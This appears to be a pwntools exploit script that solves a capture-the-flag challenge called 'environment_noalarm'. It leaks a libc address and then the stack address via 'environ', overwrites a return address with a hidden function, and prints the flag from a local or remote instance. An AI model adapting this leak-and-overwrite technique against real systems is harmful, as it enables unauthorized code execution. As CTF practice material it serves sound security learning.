#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./environment_noalarm')

if args.REMOTE:
	p = remote('138.68.141.182',31076)
	libc = ELF('./libc.so.6')
else:
	p = process(binary.path)
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# libc leak
for i in range(5):
	p.sendlineafter('> ','2')
	p.sendlineafter('> ','2')
	p.sendlineafter('> ','n')

p.recvuntil('gift:')
p.recvuntil('[')
p.recvuntil('[')
printf = int(p.recvline().strip(b']\n').decode(),16)
log.info('printf: ' + hex(printf))
libc.address = printf - libc.sym.printf
log.info('libc.address: ' + hex(libc.address))

# stack leak
for i in range(5):
	p.sendlineafter('> ','2')
	p.sendlineafter('> ','2')
	p.sendlineafter('> ','n')

p.sendlineafter('> ',hex(libc.sym.environ))
p.recv(4) # ANSI color, grow up
_ = p.recv(6)
environ = u64(_ + b'\0\0')
log.info('environ: ' + hex(environ))

# plant
p.sendlineafter('> ','1')
p.sendlineafter('> ',hex(environ - 0x120))
p.sendlineafter('> ',hex(binary.sym.hidden_resources))
p.recvline()
p.recvline()
print(p.recvuntil('}').decode())
